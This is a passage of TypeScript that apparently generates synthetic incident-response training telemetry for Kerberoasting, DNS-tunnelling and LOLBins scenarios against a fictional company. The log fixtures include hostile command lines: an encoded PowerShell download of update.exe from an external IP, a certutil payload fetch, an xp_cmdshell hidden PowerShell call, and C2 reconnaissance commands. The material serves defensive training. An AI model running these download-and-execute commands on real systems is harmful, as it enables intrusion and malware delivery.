    // T+4min+40s: TGS for BACKUP service
    {
      id: "evt_kerb_05_tgs_backup", ts: T(4 * MIN + 40_000),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: "DC01", user_email: attackerUser, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1558.003", mitre_tactic: "Credential Access",
      description: "A third RC4-encrypted TGS ticket was requested for BACKUP/srv-backup01 (svc-backup), the third in 40 seconds.",
      raw: {
        "winlog.event_id": "4769",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01.nexacorp.com",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        // 4769: TargetUserName is the REQUESTING principal, not the service.
        "winlog.event_data.TargetUserName": "m.cohen@NEXACORP.COM",
        "winlog.event_data.TargetDomainName": "NEXACORP.COM",
        // ServiceName carries the service ACCOUNT name; the SPN that was
        // requested (BACKUP/srv-backup01) is named in the event description.
        "winlog.event_data.ServiceName": "svc-backup",
        "winlog.event_data.ServiceSid": "S-1-5-21-3421479547-3897544621-1789562108-1310",
        "winlog.event_data.TicketOptions": "0x40810000",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "51244",
        "winlog.event_data.Status": "0x0",
        "event.code": "4769",
        "event.action": "kerberos-service-ticket-requested",
        "event.outcome": "success",
        "kerberos.encryption_type": "RC4-HMAC",
        "user.name": "m.cohen",
        "host.name": "DC01.nexacorp.com",
        "source.ip": attackerIp,
      },
    },

    // ── First alert: Defender for Identity, after the requests it reports ─────
    // Its real alert name for an account enumerating SPN holders and pulling
    // their service tickets, as the alert lands in the SIEM (SecurityAlert):
    // name, window, entities — source computer and account, the target accounts.
    {
      id: "evt_kerb_02_mdi_spn_exposure", ts: T(6 * MIN),
      source: "ad", vendor: "Microsoft Defender for Identity",
      event_type: "ids_signature", severity: "high", is_detection: true,
      hostname: attackerHost, user_email: attackerUser, src_ip: attackerIp,
      mitre_technique: "T1558.003", mitre_tactic: "Credential Access",
      description: "Defender for Identity raised 'Suspected Kerberos SPN exposure' for m.cohen on WS-DEV-4412 (10.10.30.44), naming 12 target service accounts including svc-mssql, svc-iis and svc-backup.",
      raw: {
        "TimeGenerated": T(6 * MIN),
        "AlertName": "Suspected Kerberos SPN exposure",
        "AlertSeverity": "High",
        "ProductName": "Azure Advanced Threat Protection",
        "VendorName": "Microsoft",
        "SystemAlertId": "b3e81d52-7c40-4f9a-a6d1-2f95c0e7b418",
        "Status": "New",
        "StartTime": T(4 * MIN),
        "EndTime": T(5 * MIN + 30_000),
        "Tactics": "CredentialAccess",
        "Techniques": "[\"T1558\"]",
        "CompromisedEntity": "m.cohen",
        "Entities": JSON.stringify([
          { $id: "2", HostName: attackerHost, DnsDomain: "nexacorp.com", Type: "host" },
          { $id: "3", Address: attackerIp, Type: "ip" },
          { $id: "4", Name: "m.cohen", NTDomain: "NEXACORP", Type: "account" },
          { $id: "5", Name: "svc-mssql", NTDomain: "NEXACORP", Type: "account" },
          { $id: "6", Name: "svc-iis", NTDomain: "NEXACORP", Type: "account" },
          { $id: "7", Name: "svc-backup", NTDomain: "NEXACORP", Type: "account" },
        ]),
        "ExtendedProperties": JSON.stringify({ "Target accounts": "12", "Source computer": attackerHost, "Source account": "m.cohen" }),
      },
    },

    // T+8min: Volume spike — 12 TGS tickets in 90 seconds
    {
      id: "evt_kerb_06_ticket_spike", ts: T(8 * MIN),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "ids_signature",
      hostname: "DC01", src_ip: attackerIp,
      severity: "high", mitre_technique: "T1558.003", mitre_tactic: "Credential Access",
      description: "Microsoft Sentinel rule 'Anomalous Kerberos service ticket volume' matched 12 RC4 (0x17) TGS requests from m.cohen for 12 distinct service accounts within 90 seconds.",
      // Analytics-rule alert as Sentinel stores it: the rule name, the counts it
      // measured and the entities — no verdict ("MassKerberoasting") of its own.
      raw: {
        "AlertName": "Anomalous Kerberos service ticket volume",
        "AlertSeverity": "High",
        "ProductName": "Azure Sentinel",
        "ProviderName": "ASI Scheduled Alerts",
        "AlertType": "c1d4e7a2-58b3-4f06-9e21-7a3b5c8d0f14_8f2a6e3c-1b47-4d95-a0c8-6e9f2b5d7a31",
        "Status": "New",
        "Tactics": "CredentialAccess",
        "Techniques": "[\"T1558\"]",
        "CompromisedEntity": "m.cohen",
        "ExtendedProperties.Query Period": "01:00:00",
        "ExtendedProperties.Number of events": 12,
        "ExtendedProperties.Time window (s)": 90,
        "ExtendedProperties.TicketEncryptionType": "0x17",
        "ExtendedProperties.Domain Controller": "DC01.nexacorp.com",
        "ExtendedProperties.Targeted SPNs": ["MSSQLSvc/srv-db01:1433", "HTTP/intranet.corp", "BACKUP/srv-backup01", "MSSQL/srv-db02:1433", "svc-sharepoint/sharepoint.corp:443", "wsman/srv-mgmt01", "cifs/srv-file01", "termserv/srv-rdp01", "svc-sap/sap-prod01:3200", "exchange/mail.corp", "svc-jenkins/jenkins01:8080", "svc-gitlab/gitlab.corp"],
        "Entities": JSON.stringify([
          { $id: "2", Name: "m.cohen", NTDomain: "NEXACORP", Type: "account" },
          { $id: "3", Address: attackerIp, Type: "ip" },
        ]),
      },
    },

    // T+15min: Login from cracked service account svc-mssql (T1078)
    {
      id: "evt_kerb_07_svcacct_login", ts: T(15 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: "srv-db01", user_email: "svc-mssql@nexacorp.com", src_ip: attackerIp,
      severity: "critical", mitre_technique: "T1078", mitre_tactic: "Initial Access",
      description: "The svc-mssql service account logged on with an interactive session (Type 10, RemoteInteractive) to srv-db01 from WS-DEV-4412.",
      raw: {
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": "srv-db01",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.TargetUserName": "svc-mssql",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        // Type 10 (RemoteInteractive), not 2. LogonType 2 is a physical console
        // session and cannot carry a source IP from another machine — and both
        // q3 and q4 build their reasoning on this field. A service account
        // holding an interactive desktop is just as damning either way.
        "winlog.event_data.LogonType": "10",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.WorkstationName": attackerHost,
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "52100",
        "winlog.event_data.ElevatedToken": "%%1842",
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "user.name": "NEXACORP\\svc-mssql",
        "host.name": "srv-db01",
        "source.ip": attackerIp,
        "authentication.protocol": "NTLM",
      },
    },

    // ── CORRELATED: svc-mssql lateral movement — SMB to file server ───────────────
    {
      id: "evt_kerb_svcacct_lateral", ts: T(16 * MIN),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "critical",
      hostname: "srv-file01", src_ip: attackerIp,
      mitre_technique: "T1021.002",
      description: "The svc-mssql service account authenticated to srv-file01 via a network logon (Type 3).",
      raw: {
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": "srv-file01",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.TargetUserName": "svc-mssql",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.WorkstationName": attackerHost,
        "winlog.event_data.IpAddress": attackerIp,
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "user.name": "NEXACORP\\svc-mssql",
        "host.name": "srv-file01",
        "source.ip": attackerIp,
        "authentication.protocol": "NTLM",
      },
    },

    // T+18min: xp_cmdshell PowerShell execution via svc-mssql (T1059.001)
    {
      id: "evt_kerb_08_xp_cmdshell", ts: T(18 * MIN),
      source: "db_monitor", vendor: "IBM Guardium", event_type: "db_query",
      hostname: "srv-db01", src_ip: attackerIp,
      severity: "critical", mitre_technique: "T1059.001", mitre_tactic: "Execution",
      // The Guardium statement is truncated as the DAM console shows long
      // statements; it used to embed the same download host as dns-tunneling.
      // What the command did next is evt_kerb_09_db_outbound.
      description: "svc-mssql executed EXEC xp_cmdshell on srv-db01 from 10.10.30.44 (osql.exe); the command is powershell -WindowStyle Hidden with a Base64 -enc argument.",
      process: { name: "sqlservr.exe", pid: 2200, path: "C:\\Program Files\\Microsoft SQL Server\\MSSQL16.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe", cmdline: "xp_cmdshell 'powershell -enc SQBFAFgAIAAo...'", user: "svc-mssql", integrity: "high" },
      raw: {
        "db.vendor": "IBM Guardium",
        "db.type": "mssql",
        "db.instance": "srv-db01",
        "db.name": "master",
        "db.user": "svc-mssql",
        "db.statement": "EXEC xp_cmdshell 'powershell -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...'",
        "db.rows_affected": 0,
        "db.duration_ms": 1200,
        "db.operation": "EXEC",
        "db.object": "xp_cmdshell",
        "db.schema": "sys",
        "client.ip": attackerIp,
        "client.application": "osql.exe",
        "event.action": "xp-cmdshell-exec",
        "event.outcome": "success",
        "user.name": "svc-mssql",
        "host.name": "srv-db01",
      },
    },

    // T+18min+6s: the database server's first outbound session — scope / containment pivot
    // A SQL server has no business opening HTTPS to the internet; this row gives
    // the analyst the external address to block and hunt for elsewhere.
    {
      id: "evt_kerb_09_db_outbound", ts: T(18 * MIN + 6_000),
      source: "firewall", vendor: "FortiGate",
      event_type: "net_connection", severity: "high", mitre_technique: "T1105", mitre_tactic: "Command and Control",
      hostname: "srv-db01", src_ip: "10.10.30.61", dst_ip: "91.243.85.117", dst_port: 443,
      description: "srv-db01 opened an outbound TCP/443 session to 91.243.85.117, six seconds after the xp_cmdshell call.",
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.srcip": "10.10.30.61",
        "data.dstip": "91.243.85.117",
        "data.dstport": "443",
        "data.proto": "6",
        "data.action": "accept",
        "data.app": "SSL",
        "data.sentbyte": 2_184,
        "data.rcvdbyte": 48_612,
        "data.sessionid": "73318842",
      },
    },

    // ── CORRELATED: Baseline — m.cohen normal Kerberos ticket pattern ─────────────
    {
      id: "evt_kerb_baseline_tgs", ts: T(-60 * MIN), is_baseline: true,
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "informational",
      hostname: attackerHost, user_email: attackerUser, src_ip: attackerIp,
      description: "m.cohen requested 2 Kerberos TGS tickets in the prior 60 minutes, both AES256-encrypted.",
      raw: {
        "winlog.event_id": "4769",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01.nexacorp.com",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.TargetUserName": "m.cohen",
        "winlog.event_data.TicketEncryptionType": "0x12",
        // Service ACCOUNT, not the SPN (cifs/dev-repo01) that was requested.
        "winlog.event_data.ServiceName": "SRV-REPO01$",
        "event.code": "4769",
        "event.action": "kerberos-service-ticket-requested",
        "event.outcome": "success",
        "kerberos.encryption_type": "AES256",
        "user.name": "m.cohen",
        "source.ip": attackerIp,
      },
    },
  ];

  return { title: "Kerberoasting → Service Account Compromise → xp_cmdshell", events, T, MIN, attackerIp };
}

/** Telemetry half of `buildDNSTunnelingScenario`: the events and the story title, no answer key. */
export function dnsTunnelingScenarioEvents() {
  const B = new Date("2026-05-20T14:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victimHost = "WS-ENG-3301";
  const victimEmail = "a.jones@nexacorp.com";
  const victimIp = "10.100.50.20";
  const c2Domain = "nexus-update-svc.xyz";
  const dnscat2Hash = makeSha256("dnscat2_client_2.4.0");
  // The PROCESS in evt_dns_01 is powershell.exe, a signed Microsoft binary; the
  // file it downloads is update.exe. Both previously carried dnscat2Hash, so one
  // SHA256 described two files and a student pivoting on the process hash would
  // have concluded powershell.exe was the implant. Same defect the neighbouring
  // LOLBins scenario has an explicit comment about having already fixed.
  const powershellBinaryHash = makeSha256("powershell_exe_system_binary");

  const events: TelemetryEvent[] = [
    // T+0: PowerShell downloads dnscat2 (T1059.001)
    {
      id: "evt_dns_01_download", ts: T(0),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1059.001", mitre_tactic: "Execution",
      description: "A hidden, Base64-encoded PowerShell command on WS-ENG-3301 downloaded update.exe (dnscat2) and saved it to C:\\Windows\\Temp\\.",
      process: {
        name: "powershell.exe", pid: 7744, path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent_name: "cmd.exe", parent_pid: 7700,
        cmdline: "powershell.exe -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOQAzAC4ANAAyAC4AMwA2AC4ANQA4AC8AdQBwAGQAYQB0AGUALgBlAHgAZQAiACwAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAdQBwAGQAYQB0AGUALgBlAHgAZQAiACkA",
        user: "a.jones", integrity: "medium",
        hash: { sha256: powershellBinaryHash },
      },
      file: { name: "update.exe", path: "C:\\Windows\\Temp\\update.exe", sha256: dnscat2Hash, size: 1048576 },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "powershell.exe",
        "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "ProcessId": "7744",
        "ProcessCommandLine": "powershell.exe -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOQAzAC4ANAAyAC4AMwA2AC4ANQA4AC8AdQBwAGQAYQB0AGUALgBlAHgAZQAiACwAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAdQBwAGQAYQB0AGUALgBlAHgAZQAiACkA...",
        "ProcessIntegrityLevel": "Medium",
        "SHA256": powershellBinaryHash,
        "InitiatingProcessFileName": "cmd.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\cmd.exe",
        "InitiatingProcessId": "7700",
        "InitiatingProcessAccountName": "a.jones",
        "InitiatingProcessAccountDomain": "NEXACORP",
        "AccountName": "a.jones",
        "AccountDomain": "NEXACORP",
        "ReportId": "9284471",
        "host.name": victimHost,
        "user.name": "NEXACORP\\a.jones",
      },
    },

    // T+3min: DNS tunneling begins — base32 encoded subdomains
    {
      id: "evt_dns_02_tunnel_begin", ts: T(3 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "dns_query",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1071.004", mitre_tactic: "Command and Control",
      description: `WS-ENG-3301 issued a DNS query whose name packs three ~63-character base32 labels — about 190 encoded characters, ~120 bytes of decoded data — beneath ${c2Domain}, the first tunnel query from update.exe.`,
      dns: { query: `KNCVGU2JJ5HD2MBRHNEE6U2UHVLVGLKFJZDS2MZTGAYTWVKTIVJD2MFXHI4TPKZ.MRSXG5DBNZ2GK43UGA2DAOBWGC3TFEB2GQ2LOEBRWYK3TUEB2WK4TFONXW4Z3JN.MFRGGZDFMZTWQ2LKNNWG233ONZSXE43UNFXW4ZLUFZSGK5DUOJ2XG5BANVXXA3D.data.${c2Domain}`, query_type: "A", response: "193.42.36.58", rcode: "NOERROR" },
      raw: {
        "event.code": "22",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.computer_name": victimHost,
        "winlog.event_data.UtcTime": "2026-05-20T14:03:00.000Z",
        "winlog.event_data.ProcessGuid": "{a1b2c3d4-d5e6-a1b2-0001-c3d4e5f60001}",
        "winlog.event_data.ProcessId": "4488",
        "winlog.event_data.Image": "C:\\Windows\\Temp\\update.exe",
        "winlog.event_data.QueryName": `KNCVGU2JJ5HD2MBRHNEE6U2UHVLVGLKFJZDS2MZTGAYTWVKTIVJD2.data.${c2Domain}`,
        "winlog.event_data.QueryStatus": "0",
        "winlog.event_data.QueryResults": `type: 1 193.42.36.58`,
        "source.ip": victimIp,
        "host.name": victimHost,
      },
    },

    // ── CORRELATED: Firewall — c2Domain newly registered (3 days old) ─────────────
    {
      id: "evt_dns_fw_newdomain", ts: T(3 * MIN + 10_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS",
      event_type: "net_connection", severity: "medium",
      src_ip: victimIp, dst_port: 53,
      hostname: victimHost,
      description: `The firewall logged DNS traffic (port 53) from WS-ENG-3301 toward ${c2Domain}, a domain registered 3 days ago.`,
      raw: {
        "event.action": "allow",
        "source.ip": victimIp,
        "destination.port": "53",
        "pan.app": "dns",
        "pan.action": "allow",
        "pan.rule": "ALLOW-DNS",
        "url.domain": c2Domain,
        "url.category": "Unknown/Uncategorized",
        "threat.category": "PossibleDNSTunnel",
      },
    },

    // ── CORRELATED: EDR process event — dnscat2 (update.exe) making DNS queries ──
    {
      id: "evt_dns_process_queries", ts: T(3 * MIN + 30_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint",
      event_type: "net_connection", severity: "high",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      mitre_technique: "T1071.004",
      description: "Defender for Endpoint identified update.exe (PID 4488) as the process generating the high-rate queries to the corporate DNS server.",
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceNetworkEvents",
        "event.action": "ConnectionSuccess",
        "DeviceName": victimHost,
        "ActionType": "ConnectionSuccess",
        "InitiatingProcessFileName": "update.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\Temp\\update.exe",
        "InitiatingProcessSHA256": dnscat2Hash,
        "InitiatingProcessId": "4488",
        "Protocol": "Udp",
        "RemotePort": "53",
        "RemoteIP": "10.10.1.1",
        "RemoteUrl": "corporate-dns.nexacorp.com",
        "host.name": victimHost,
        "user.name": "NEXACORP\\a.jones",
        "AccountName": "a.jones",
        "AccountDomain": "NEXACORP",
        "source.ip": victimIp,
      },
    },

    // T+6min: DNS query volume spike — 847 queries to attacker domain in 60 seconds
    {
      id: "evt_dns_03_volume_spike", ts: T(6 * MIN),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "ids_signature",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      // Sentinel alert severity is High / Medium / Low / Informational — no "Critical".
      severity: "high", mitre_technique: "T1071.004", mitre_tactic: "Command and Control",
      description: `Microsoft Sentinel correlated 847 DNS queries from WS-ENG-3301 to *.${c2Domain} within 60 seconds.`,
      raw: {
        "AlertName": "DNSTunneling_VolumeSpike",
        "AlertSeverity": "High",
        "alert.rule.id": "DNS-TUNNEL-001",
        "host.name": victimHost,
        "destination.domain": `*.${c2Domain}`,
        "ExtendedProperties.Number of events": 847,
        "ExtendedProperties.Time window (s)": 60,
        "ExtendedProperties.Average Subdomain Length": "52.3",
        "ExtendedProperties.Max Subdomain Length": "63",
        "ExtendedProperties.Baseline Query Rate": "23",
        "ExtendedProperties.Baseline Subdomain Length": "8",
        "ExtendedProperties.Baseline Subdomain Entropy": "2.1",
        "ExtendedProperties.Deviation Factor": "36.8",
        "ExtendedProperties.Query Types": ["A", "TXT"],
        "event.action": "correlation-alert",
        "event.outcome": "alerted",
        "alert.type": "DNSTunneling",
        "source.ip": victimIp,
      },
    },

    // T+10min: C2 commands via DNS TXT records
    {
      id: "evt_dns_04_txt_c2", ts: T(10 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "dns_query",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "critical", mitre_technique: "T1071.004", mitre_tactic: "Command and Control",
      description: `WS-ENG-3301 queried cmd.${c2Domain} for a TXT record; the response decodes to whoami /all && net user.`,
      dns: { query: `cmd.${c2Domain}`, query_type: "TXT", response: "d2hvYW1pIC9hbGwgJiYgbmV0IHVzZXI=", rcode: "NOERROR" },
      raw: {
        "event.code": "22",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.computer_name": victimHost,
        "winlog.event_data.UtcTime": "2026-05-20T14:10:00.000Z",
        "winlog.event_data.ProcessGuid": "{a1b2c3d4-d5e6-a1b2-0001-c3d4e5f60001}",
        "winlog.event_data.ProcessId": "4488",
        "winlog.event_data.Image": "C:\\Windows\\Temp\\update.exe",
        "winlog.event_data.QueryName": `cmd.${c2Domain}`,
        "winlog.event_data.QueryStatus": "0",
        "winlog.event_data.QueryResults": "type: 16 d2hvYW1pIC9hbGwgJiYgbmV0IHVzZXI=",
        "source.ip": victimIp,
        "host.name": victimHost,
      },
    },

    // T+14min: Data begins exfiltrating via DNS subdomains (T1041)
    {
      id: "evt_dns_05_exfil_start", ts: T(14 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "dns_query",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "critical", mitre_technique: "T1041", mitre_tactic: "Exfiltration",
      description: `WS-ENG-3301 sent a DNS query whose base64-encoded subdomain decodes to admin@nexacorp.com.`,
      // The dnscat2 server ACKs each data chunk with an answer, so the resolver sees a
      // normal NOERROR + A record — not NXDOMAIN. (A tunnel that got NXDOMAIN back
      // would be a tunnel that isn't working.) rcode, QueryStatus 0 and the answer
      // must agree.
      dns: { query: `YWRtaW5AbmV4YWNvcnAuY29t.data.${c2Domain}`, query_type: "A", response: "193.42.36.58", rcode: "NOERROR" },
      raw: {
        "event.code": "22",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.computer_name": victimHost,
        "winlog.event_data.UtcTime": "2026-05-20T14:14:00.000Z",
        "winlog.event_data.ProcessGuid": "{a1b2c3d4-d5e6-a1b2-0001-c3d4e5f60001}",
        "winlog.event_data.ProcessId": "4488",
        "winlog.event_data.Image": "C:\\Windows\\Temp\\update.exe",
        "winlog.event_data.QueryName": `YWRtaW5AbmV4YWNvcnAuY29t.data.${c2Domain}`,
        "winlog.event_data.QueryStatus": "0",
        "winlog.event_data.QueryResults": "type: 1 193.42.36.58",
        "source.ip": victimIp,
        "host.name": victimHost,
      },
    },

    // T+18min: Large file chunked over DNS — hundreds of queries
    {
      id: "evt_dns_06_file_chunks", ts: T(18 * MIN),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "ids_signature",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1041", mitre_tactic: "Exfiltration",
      description: `Microsoft Sentinel correlated 247 sequential DNS queries (base32chunk_0001 through base32chunk_0247) from WS-ENG-3301 to data.${c2Domain} over 4 minutes.`,
      raw: {
        "AlertName": "DNSTunneling_FileChunks",
        "AlertSeverity": "High",
        "alert.rule.id": "DNS-EXFIL-002",
        "host.name": victimHost,
        "destination.domain": `*.data.${c2Domain}`,
        "ExtendedProperties.Number of events": 247,
        "ExtendedProperties.Time window (s)": 240,
        "ExtendedProperties.Chunk Pattern": `base32chunk_NNNN.data.${c2Domain}`,
        "ExtendedProperties.First Chunk": `base32chunk_0001.data.${c2Domain}`,
        "ExtendedProperties.Last Chunk Seen": `base32chunk_0247.data.${c2Domain}`,
        "event.action": "correlation-alert",
        "event.outcome": "alerted",
        "alert.type": "DNSTunnelingFileExfiltration",
        "source.ip": victimIp,
      },
    },

    // ── CORRELATED: Baseline — WS-ENG-3301 normal DNS query volume ────────────────
    {
      id: "evt_dns_baseline_volume", ts: T(-10 * MIN), is_baseline: true,
      source: "dns", vendor: "Windows DNS Server",
      event_type: "dns_query", severity: "informational",
      hostname: victimHost, src_ip: victimIp,
      description: "WS-ENG-3301 sent about 23 DNS queries per minute to developer tool domains (GitHub, npm, VS Code).",
      raw: {
        "event.action": "dns_baseline_aggregate",
        "host.name": victimHost,
        "source.ip": victimIp,
        "dns.top_domains": ["api.github.com", "registry.npmjs.org", "code.visualstudio.com"],
        "dns.query_types": ["A", "AAAA"],
        "event.outcome": "success",
      },
    },
  ];

  return { title: "DNS Tunneling — C2 Channel & Data Exfiltration", events, T, MIN, victimIp, c2Domain, dnscat2Hash };
}

/** Telemetry half of `buildLOLBinsScenario`: the events and the story title, no answer key. */
export function lolBinsScenarioEvents() {
  const B = new Date("2026-05-25T11:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victimHost = "WS-HR-1133";
  const victimEmail = "s.patel@nexacorp.com";
  const victimIp = "10.10.20.77";
  const payloadHash = makeSha256("srvhost_dll_nexacorp_lolbins");
  const certutilHash = makeSha256("certutil_downloaded_update_exe");
  // certutil.exe is a signed Windows binary — it cannot share a hash with the
  // payload it fetched, and the platform teaches hash-based pivoting.
  const certutilBinaryHash = makeSha256("certutil_exe_system_binary");
  // Same principle, two more files. `payloadHash` was previously reused as the
  // hash of the bitsadmin-fetched binary AND of the rundll32.exe process image,
  // so one SHA256 described three different files — in a scenario whose own
  // q1 explanation says "one SHA256 identifies one file". A student pivoting on
  // that hash would have concluded rundll32.exe was malware.
  const bitsPayloadHash   = makeSha256("bitsadmin_fetched_svchost_update_exe");
  const rundll32BinaryHash = makeSha256("rundll32_exe_system_binary");

  const events: TelemetryEvent[] = [
    // T-2min: Phishing email delivers the macro that spawns cmd.exe (initial access)
    {
      id: "evt_lol_00_phish", ts: T(-2 * MIN),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victimEmail, src_ip: "91.108.56.207",
      severity: "high", mitre_technique: "T1566.001", mitre_tactic: "Initial Access",
      description: "s.patel received an email with a macro-enabled Word attachment (HR_Policy_Update.docm) from a domain registered 4 days ago. SPF and DKIM both failed.",
      raw: {
        "event.action": "EmailDelivered", "event.outcome": "success",
        "email.from.address": "hr-updates@nexacorp-portal.ru",
        "email.to.address": victimEmail,
        "email.subject": "HR Policy Update — Acknowledge by EOD",
        "email.attachment.name": "HR_Policy_Update.docm",
        "email.direction": "inbound",
        "file.size": "38912",
        "source.ip": "91.108.56.207",
        "spf.result": "fail", "dkim.result": "fail",
        "action_result": "delivered",
        "threat.category": "Phishing",
      },
    },
    // T+0: certutil.exe downloads payload (T1105)
    {
      id: "evt_lol_00b_macro_cmd", ts: T(-30_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1204.002", mitre_tactic: "Execution",
      description: "WINWORD.EXE spawned a command shell on the HR workstation WS-HR-1133.",
      process: {
        name: "cmd.exe", pid: 4420, path: "C:\\Windows\\System32\\cmd.exe",
        parent_name: "WINWORD.EXE", parent_pid: 3308,
        cmdline: "cmd.exe /c",
        user: "s.patel", integrity: "medium",
        hash: { sha256: makeSha256("cmd_exe_system_binary") },
      },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "cmd.exe",
        "FolderPath": "C:\\Windows\\System32\\cmd.exe",
        "ProcessId": "4420",
        "ProcessCommandLine": "cmd.exe /c",
        "InitiatingProcessFileName": "WINWORD.EXE",
        "InitiatingProcessId": "3308",
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
      },
    },
    {
      id: "evt_lol_01_certutil", ts: T(0),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1105", mitre_tactic: "Command and Control",
      description: "certutil.exe, spawned from cmd.exe, downloaded update.exe from pkg-mirror-eu.ru on WS-HR-1133.",
      process: {
        name: "certutil.exe", pid: 4440, path: "C:\\Windows\\System32\\certutil.exe",
        parent_name: "cmd.exe", parent_pid: 4420,
        cmdline: "certutil -urlcache -split -f http://pkg-mirror-eu.ru/update.exe update.exe",
        user: "s.patel", integrity: "medium",
        hash: { sha256: certutilBinaryHash },
      },
      file: { name: "update.exe", path: "C:\\Users\\s.patel\\Downloads\\update.exe", sha256: certutilHash, size: 204800 },
      network: { url: "http://pkg-mirror-eu.ru/update.exe", domain: "pkg-mirror-eu.ru", bytes_out: 204800 },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "certutil.exe",
        "FolderPath": "C:\\Windows\\System32\\certutil.exe",
        "ProcessCommandLine": "certutil -urlcache -split -f http://pkg-mirror-eu.ru/update.exe update.exe",
        "InitiatingProcessFileName": "cmd.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\cmd.exe",
        "InitiatingProcessAccountName": "s.patel",
        "InitiatingProcessAccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
        "SHA256": certutilBinaryHash,
        "AccountName": "s.patel",
